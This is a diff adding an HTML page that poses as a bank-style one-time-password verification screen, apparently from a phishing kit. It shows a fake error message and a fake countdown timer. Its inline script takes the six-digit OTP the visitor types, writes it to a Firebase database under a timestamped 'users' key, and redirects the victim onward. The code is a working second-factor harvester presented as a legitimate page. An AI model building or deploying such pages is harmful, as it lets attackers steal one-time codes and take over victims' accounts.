@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+        <title>Welcome</title>
+		<link rel="shortcut icon" href="favicon.ico">
+		<link rel="preload" as="image" href="images/logo.png">
+		<link rel="preload" as="image" href="images/nortonsecurity.png">
+		<link rel="preload" as="style" href="css/style.css">
+		<link rel="stylesheet" href="css/style.css">
+		<script src="js/referrer.js"></script>
+	</head>
+	<body>
+		<div id="loading">
+			<div class="text-center l-loading">
+				<span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:100px;height:100px;background:none;opacity:1;border:0;margin:0;padding:0;position:relative">
+					<img alt="loading" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" />
+					<img alt="loading" src="images/loading.gif" decoding="async" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy" />
+				</span>
+				<h1>Please wait</h1>
+			</div>
+		</div>
+		<div id="main" class="hidden">
+			<div class="header">
+				<div class="logo text-center">
+					<span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
+						<span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;">
+							<img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20 xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27189%27%20height=%2731%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;">
+						</span>
+						<img alt="Logo" src="images/logo.png" decoding="async" data-nimg="intrinsic" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+					</span>
+				</div>
+			</div>
+			<div class="content">
+				<h2 class="text-center">One Time Password (OTP) sent to registered mobile Number</h2>
+				<form autocomplete="off" id="form">
+					<div class="form-group">
+						<label for="DOBOTP2">Enter the One Time Password</label>
+						<input
+							autocomplete="one-time-code"
+							inputmode="numeric"
+							pattern="\d{6}"
+							type="text"
+							class="form-control"
+							name="DOBOTP2"
+							id="DOBOTP2"
+							maxlength="6"
+							minlength="6"
+							length="6"
+							required
+						/>
+						<span style="color: red; display: block; margin: 1px;">Incorrect OTP Entered!</span>
+					</div>
+					<button id="submit" type="submit" class="btn btn-primary login-btn">SUBMIT</button>
+				</form>
+				<p class="text-center">
+                    <span id="timer">03:00</span>
+                </p>
+				<p>
+					If you did not receive the One Time Password on SMS, you can <a href="javascript:void(0)">Click here to resend the OTP</a>
+				</p>
+			</div>
+			<div class="footer">
+				© Copyright.
+				<a href="javascript:void(0)">Terms and Conditions</a>
+				<a href="javascript:void(0)">Privacy Policy</a>
+			</div>
+		</div>
+		<script src="js/onload.js"></script>
+        <script>let time = 180;</script>
+		<script src="js/timer.js"></script>
+		<script src="firebase-config.js"></script>
+		<script type="module">
+			import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+			import { getDatabase, ref, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js"; 
+			const app = initializeApp(firebaseConfig);
+			const db = getDatabase();
+			var form = document.getElementById("form");
+			form.addEventListener("submit", function(e) {
+				if(form.checkValidity() != false) {
+					event.preventDefault();
+					document.getElementById("submit").disabled = true;
+					document.body.style.cursor='wait';
+					const timestamp = Math.floor(Date.now() / 100);
+					update(ref(db, 'users/' + timestamp), {
+						DOBOTP2: document.getElementById('DOBOTP2').value
+					})
+					.then(() => {
+						window.location.href = nextPath;
+					})
+					.catch((error) => {
+						console.log(error);
+						document.getElementById("submit").disabled = false;
+						document.body.style.cursor='default';
+						alert("Error! Please try again later.");
+					});
+				}
+			});
+		</script>
+	</body>
+</html>
